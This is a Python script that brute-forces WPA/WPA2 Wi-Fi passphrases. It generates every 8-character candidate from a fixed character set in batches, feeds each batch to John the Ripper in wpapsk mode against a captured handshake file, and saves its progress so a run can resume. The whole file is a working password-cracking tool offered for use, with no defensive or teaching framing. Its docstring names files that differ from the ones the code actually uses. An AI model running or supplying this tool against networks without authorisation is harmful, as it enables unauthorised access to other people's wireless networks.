'''
Run this in the directory where the capture file is present ('capture-01.cap')
Optimisations:
    Triple repititions ignored

python3 aircrack_on_the_fly.py

It will generate a progress file and a pass.dict file. After successful completion will generate a keys.txt file
'''

import os
import subprocess as sb
import sys
import time

# input values
# _input = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
# _input = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&*+,-.:;<=>?@^_'
_input = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&*+-?@'
MIN_LENGTH = 8
MAX_LENGTH = 8
MAX_NUMBER_OF_LINES = 200000
PROGRESS_FILENAME = 'progress'
PASS_FILENAME = 'pass.dict'
OUTPUT_KEYS_FILENAME = '/root/.john/john.pot'
CAPTURE_FILENAME = 'crackme'
COMMAND = ['john','-w=' + PASS_FILENAME, '-format=wpapsk', CAPTURE_FILENAME]

# Calculated values
_input = list(_input)
total_characters = len(_input)
current_lines_written = 0
status = []
result = []


def check_if_resuming():
    global status
    cur_length = 0
    if os.path.exists(PROGRESS_FILENAME):
        print('Progress found. Resuming...')
        f = open(PROGRESS_FILENAME, 'r')
        status = [int(x) for x in f.readline().split(' ')]
        cur_length = int(f.readline())
        f.close()

        run_cracker()
    else:
        print('Progress not found. Starting from first')
        cur_length = MIN_LENGTH
        reset_status(cur_length)

    return cur_length



def reset_status(cur_length):
    global status
    status = [0 for i in range(cur_length)]


def write_out_generated_data(total_possible_lines):
    global result
    global current_lines_written

    f = open(PASS_FILENAME, 'w')
    output_string = '\n'.join(result)
    f.write(output_string)
    f.close()

    current_lines_written += len(result)
    print('Written out ' + str((current_lines_written*100)/total_possible_lines) + ' %')
    print('Word range written : ' + result[0] + ' - ' + result[-1])
    result = []


def write_out_current_progress(cur_length):
    f = open(PROGRESS_FILENAME, 'w')
    out_string = ' '.join([str(x) for x in status])
    f.write(out_string)
    f.write('\n' + str(cur_length))
    f.close()


def run_cracker():
	# if os.path.exists('keys.txt'):
	#	print('keys file exists.')

	# sb.run(COMMAND, stdout=sb.DEVNULL)
	sb.run(COMMAND)

	if os.path.exists(OUTPUT_KEYS_FILENAME):
            f = open(OUTPUT_KEYS_FILENAME, 'r')
            if f.readline() != '':
                print('Password found')
                f.close()
		# os.remove(PROGRESS_FILENAME)
                sys.exit(0)
            else:
                f.close()


def run_component(total_possible_lines, cur_length):
    write_out_generated_data(total_possible_lines)
    write_out_current_progress(cur_length)
    run_cracker()
    print('Current component running finished\n')


def generate(cur_val, cur_depth, cur_length, total_possible_lines):
    while status[cur_depth] < total_characters:
        # Optimisations
        if cur_depth > 1:
            if cur_val[-1] == _input[status[cur_depth]] and cur_val[-2] == _input[status[cur_depth]]:
                if status[cur_depth] != total_characters - 1 and not _input[status[cur_depth]].isdigit():
                    status[cur_depth] += 1


        # normal operations
        val = cur_val + _input[status[cur_depth]]

        if cur_depth + 1 < cur_length:
            generate(val, cur_depth + 1, cur_length, total_possible_lines)
        else:
            result.append(val)

            if len(result) == MAX_NUMBER_OF_LINES:
                run_component(total_possible_lines, cur_length)

        status[cur_depth] += 1

    # Resetting value back to 0 once max reached
    status[cur_depth] = 0


if __name__ == "__main__":
    start_time = time.time()
    cur_length = check_if_resuming()
    first_run = True

    try:
        while cur_length <= MAX_LENGTH:
            current_lines_written = 1

            for i in range(len(status)):
                current_lines_written *= (int(status[i])+1)

            current_lines_written -= 1
            
            total_possible_lines = pow(total_characters, cur_length)

            if not first_run:
                reset_status(cur_length)
            else:
                first_run = False

            print('Current length of words: ' + str(cur_length))
            print('Total values to be generated: ' + str(total_possible_lines))

            generate('', 0, cur_length, total_possible_lines)

            # print(*result, sep='\n')
            run_component(total_possible_lines, cur_length)
            cur_length += 1

            # os.remove(PROGRESS_FILENAME)
            print ('Remove progress file')
    except:
        print('You suck. Didn\'t work')
        print("--- %s seconds ---" % (time.time() - start_time))

    print('Completed...')
